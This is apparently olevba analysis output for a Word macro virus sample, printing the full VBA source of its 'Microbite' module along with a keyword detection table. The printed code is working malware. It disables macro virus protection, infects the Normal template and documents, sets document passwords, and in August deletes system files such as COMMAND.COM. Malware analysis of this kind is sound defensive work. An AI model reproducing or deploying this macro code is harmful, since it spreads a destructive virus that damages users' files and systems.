olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade.e-eebe72b8a98a7ad72c6c2f8eb6c42c348d637643
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade.e-eebe72b8a98a7ad72c6c2f8eb6c42c348d637643 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Microbite.bas 
in file: Virus.MSWord.NightShade.e-eebe72b8a98a7ad72c6c2f8eb6c42c348d637643 - OLE stream: 'Macros/VBA/Microbite'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Microbite Macro"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
On Error GoTo Microbite

Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone

WordBasic.DisableAutoMacros 0
Options.VirusProtection = False

Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate

DocumentInstalled = False
GlobalInstalled = False

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name _
        = "Microbite" Then
        DocumentInstalled = True
    End If
Next

For J = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(J).Name _
        = "Microbite" Then
        GlobalInstalled = True
    End If
Next

If DocumentInstalled = False Then
    Application.OrganizerCopy _
      Source:=NormalTemplate.FullName, _
      Destination:=ActiveDocument.FullName, _
      Name:="Microbite", _
      Object:=wdOrganizerObjectProjectItems
    ActiveDoc.SaveAs _
      FileName:=ActiveDoc.Name, _
      FileFormat:=wdFormatTemplate
End If
    
If GlobalInstalled = False Then
    Application.OrganizerCopy _
      Source:=ActiveDocument.FullName, _
      Destination:=NormalTemplate.FullName, _
      Name:="Microbite", _
      Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
End If

If WeekDay(Now()) = 1 And 6 Then
    Cr$ = Chr$(13)
    Sp$ = String$(33, " ")
    Msg_$ = "Attention : "
    Msg1$ = "Read my lips : "
    Msg2$ = "Mess with the best, die like the rest !"
    Msg3$ = "By "
    Crtr$ = "The 680165"
    Assistant.Visible = True
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Text = Msg1$ + Cr$ + Cr$ + Msg2$ + Cr$ + Cr$ + Sp$ + _
            Msg3$ + Crtr$
        .Heading = Msg_$
        .Show
    End With
    If ActiveDoc.HasPassword = False Then
        ActiveDoc.Password = "Microbite"
    End If
End If

If Month(Now()) <> 8 Then GoTo Selamat
    Ojek_$ = "COMMAND.COM"
    Ojek1$ = "IOSYS.SYS"
    ChDir "C:\"
    SetAttr Ojek_$, vbNormal
    SetAttr Ojek1$, vbNormal
    Kill Ojek_$
    Kill Ojek1$


Saya$ = "680165"
MkDir Saya$
SetAttr Saya$, vbVolume

Selamat:

Application.UserName = "The 680165"
Application.UserInitials = "680165"
Application.UserAddress = "the680165@hotmail.com"
   
Microbite:
End Sub
Sub ToolsMacro()
MsgBox "Mess with the best, die like the rest . .", vbInformation
End Sub
Sub ViewVBCode()
MsgBox "Mess with the best, die like the rest . .", vbInformation
End Sub
Sub ToolsCustomize()
Attribute ToolsCustomize.VB_Description = "Microbite Macro"
Attribute ToolsCustomize.VB_ProcData.VB_Invoke_Func = "Normal.Microbite.ToolsCustomize"
MsgBox "Mess with the best, die like the rest . .", vbInformation
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

